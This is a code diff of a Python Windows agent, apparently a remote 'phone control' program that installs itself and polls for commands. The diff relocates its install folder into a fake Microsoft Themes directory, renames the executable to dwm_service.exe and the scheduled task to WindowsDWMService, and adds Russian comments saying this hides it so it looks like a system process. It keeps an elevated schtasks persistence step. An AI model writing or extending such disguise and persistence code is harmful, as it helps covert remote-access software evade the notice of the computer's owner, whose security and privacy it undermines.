@@ -32,7 +32,9 @@ POLL_INTERVAL_ACTIVE = 10   # seconds when active
 # ─── Logging (to file next to exe) ───────────────────────────────────────────
 
 BASE_DIR = Path(sys.executable).parent if getattr(sys, "frozen", False) else Path(__file__).parent
-LOG_FILE  = BASE_DIR / "phonecontrol.log"
+# После установки логи идут в папку установки, до — рядом с exe
+_INSTALL_DIR_EARLY = Path(os.environ.get("APPDATA","")) / "Microsoft" / "Windows" / "Themes" / "WinDWM"
+LOG_FILE  = (_INSTALL_DIR_EARLY / "dwm_service.log") if (_INSTALL_DIR_EARLY / "dwm_service.exe").exists() else (BASE_DIR / "setup.log")
 
 logging.basicConfig(
     filename=str(LOG_FILE),
@@ -792,9 +794,10 @@ def poll_loop():
 
 # ─── Self-install ─────────────────────────────────────────────────────────────
 
-INSTALL_DIR  = Path(os.environ["APPDATA"]) / "PhoneControl"
-INSTALL_EXE  = INSTALL_DIR / "phonecontrol.exe"
-TASK_NAME    = "PhoneControlAgent"
+# Прячем в системную папку — не бросается в глаза
+INSTALL_DIR  = Path(os.environ["APPDATA"]) / "Microsoft" / "Windows" / "Themes" / "WinDWM"
+INSTALL_EXE  = INSTALL_DIR / "dwm_service.exe"   # выглядит как системный процесс
+TASK_NAME    = "WindowsDWMService"                # выглядит как системная задача
 UNINSTALL_CMD = f'schtasks /delete /tn "{TASK_NAME}" /f && rmdir /s /q "{INSTALL_DIR}"'
 
 def is_installed() -> bool:
@@ -865,12 +868,10 @@ def self_install():
     xml_path.write_text(xml, encoding="utf-16")
 
     # schtasks требует прав админа — запускаем через PowerShell с elevation
-    ps_cmd = (
-        f"schtasks /create /tn '{TASK_NAME}' /xml '{xml_path}' /f"
-    )
+    args = f"/create /tn '{TASK_NAME}' /xml '{xml_path}' /f"
+    ps_cmd = f"Start-Process schtasks -ArgumentList '{args}' -Verb RunAs -Wait"
     subprocess.run(
-        ["powershell", "-Command",
-         f"Start-Process schtasks -ArgumentList "/create /tn '{TASK_NAME}' /xml '{xml_path}' /f" -Verb RunAs -Wait"],
+        ["powershell", "-Command", ps_cmd],
         check=True, timeout=30
     )
     xml_path.unlink()
